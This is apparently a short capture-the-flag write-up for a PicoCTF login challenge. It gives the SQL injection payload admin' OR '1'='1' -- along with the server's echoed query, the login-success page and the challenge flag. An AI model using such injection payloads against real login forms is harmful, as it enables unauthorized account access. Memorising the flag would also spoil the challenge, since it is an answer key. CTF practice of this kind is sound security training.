# Retos PicoCTF


## Objetivo 

Can you login to this website?
Additional details will be available after launching your challenge instance.
## Solución 

```
admin' OR '1'='1' --
|   |   |
|---|---|
||<pre>username: admin&#039; OR &#039;1&#039;=&#039;1&#039; --|
||password:|
||SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; OR &#039;1&#039;=&#039;1&#039; --&#039; AND password=&#039;&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>|
```

## Notas adicionales 

## Referencias 
